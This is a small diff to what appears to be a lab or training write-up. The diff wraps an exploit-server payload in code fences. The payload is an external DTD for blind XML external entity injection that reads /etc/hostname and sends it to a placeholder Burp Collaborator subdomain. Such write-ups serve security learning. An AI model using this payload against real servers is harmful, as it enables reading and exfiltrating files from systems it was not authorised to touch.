@@ -176,12 +176,12 @@ payload repeater:
 
 exploit server body:
 
-
+```
 <! ENTITY % file SYSTEM "file:///etc/hostname">
 <! ENTITY % eval " <! ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file; '>">
 %eval;
 %exfil;
-
+```
 
 
 <img width="1195" height="608" alt="image" src="https://github.com/user-attachments/assets/f4446ade-0192-4496-b6a4-636c7ffc784c" />
